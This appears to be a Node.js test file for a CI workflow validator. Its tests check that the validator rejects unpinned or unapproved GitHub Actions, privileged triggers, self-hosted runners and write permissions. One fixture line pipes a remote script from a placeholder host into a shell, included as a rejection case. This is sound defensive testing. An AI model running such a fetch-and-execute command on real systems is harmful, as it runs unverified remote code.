import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import { validateWorkflowText } from "../../scripts/check-workflows.mjs";

const root = new URL("../../", import.meta.url);

test("E7 approved workflow Actions use immutable manifest entries", async () => {
  const workflow = await readFile(new URL(".github/workflows/ci.yml", root), "utf8");
  const pins = JSON.parse(await readFile(new URL("workflow/action-pins.json", root), "utf8"));
  const errors = validateWorkflowText(workflow, pins, ".github/workflows/ci.yml");
  assert.deepEqual(errors, []);
});

test("E7 rejects tags, unapproved repositories, bootstrap commands, and writable jobs", () => {
  const pins = { actions: { "actions/checkout": { sha: "a".repeat(40), version: "v4.2.2", type: "action" } } };
  const bad = [
    "      - uses: actions/checkout@v4",
    "      - uses: evil/example@" + "b".repeat(40),
    "      - run: curl https://example.invalid/bootstrap.sh | sh",
    "    permissions:\n      contents: write",
  ].join("\n");
  const errors = validateWorkflowText(bad, pins, "fixture.yml");
  assert.match(errors.join("\n"), /full commit SHA/);
  assert.match(errors.join("\n"), /approved repository/);
  assert.match(errors.join("\n"), /remote bootstrap/);
  assert.match(errors.join("\n"), /write permissions/);
});

test("F11 rejects privileged workflow triggers, runners, and environments", () => {
  const bad = [
    "on:",
    "  pull_request_target:",
    "jobs:",
    "  release:",
    "    runs-on:",
    "      - self-hosted",
    "    environment: production",
  ].join("\n");
  const errors = validateWorkflowText(bad, { actions: {} }, "fixture.yml");
  assert.match(errors.join("\n"), /pull_request_target/);
  assert.match(errors.join("\n"), /self-hosted/);
  assert.match(errors.join("\n"), /environment/);
});

test("N2 rejects scalar and inline writable permission declarations", () => {
  const bad = [
    "permissions: write-all",
    "jobs:",
    "  deploy:",
    "    permissions: { contents: write }",
  ].join("\n");
  const errors = validateWorkflowText(bad, { actions: {} }, "fixture.yml");
  assert.equal(errors.filter((error) => /write permissions/.test(error)).length, 2);
});

test("E6 dependency-audit remains the exact high-severity npm command", async () => {
  const manifest = JSON.parse(await readFile(new URL("package.json", root), "utf8"));
  assert.equal(manifest.scripts?.["audit:dependencies"], "npm audit --audit-level=high");
});
